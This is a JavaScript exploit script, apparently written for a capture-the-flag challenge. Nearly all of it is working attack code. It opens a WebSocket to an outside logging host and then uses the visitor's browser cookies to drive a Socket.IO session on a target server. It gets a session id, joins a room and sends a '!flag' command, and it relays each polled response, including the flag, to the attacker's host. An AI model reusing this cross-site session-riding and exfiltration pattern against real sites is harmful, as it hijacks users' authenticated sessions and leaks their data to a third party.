const logSocket = new WebSocket('wss://jmy.li:1337');

logSocket.addEventListener('open', _event => {
    doExploit();
});

function log(msg){
    if(logSocket.readyState == WebSocket.OPEN){
        logSocket.send(JSON.stringify(msg));
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function genPayload(body){
    let data = '42/test,' + body;
    data = '' + data.length + ':' + data
    return data
}

async function doExploit(){
    const base_url = 'http://nine.jh2i.com:50022'

    let res = await fetch(base_url + '/socket.io/', {'credentials': 'include'});
    let text = await res.text();

    let sid = text.split('sid":"')[1].split('",')[0];
    log('[*] Got sid: ' + sid);

    // handshake
    await fetch(base_url + '/socket.io/?EIO=3&transport=polling&sid=' + sid, {'method': 'POST', 'mode': 'no-cors', 'credentials': 'include', 'body': '8:40/test,'});
    log('[*] Handshake complete');
    await sleep(100);

    // join room
    let payload = genPayload('["join",{"room":"rpjim"}]');
    await fetch(base_url + '/socket.io/?EIO=3&transport=polling&sid=' + sid, {'method': 'POST', 'mode': 'no-cors', 'credentials': 'include', 'body': payload});
    log('[*] Joined room');
    await sleep(100);

    // start initial poll
    res = await fetch(base_url + '/socket.io/?EIO=3&transport=polling&sid=' + sid, {'credentials': 'include'});
    text = await res.text();
    log('[*] Polling result: ' + text);

    // send flag command
    payload = genPayload('["my_room_event",{"data":"!flag","room":"rpjim"}]');
    await fetch(base_url + '/socket.io/?EIO=3&transport=polling&sid=' + sid, {'method': 'POST', 'mode': 'no-cors', 'credentials': 'include', 'body': payload});
    log('[*] Sent flag command');

    // poll for flag
    res = await fetch(base_url + '/socket.io/?EIO=3&transport=polling&sid=' + sid, {'credentials': 'include'});
    text = await res.text();
    log('[*] Polling result: ' + text);
}
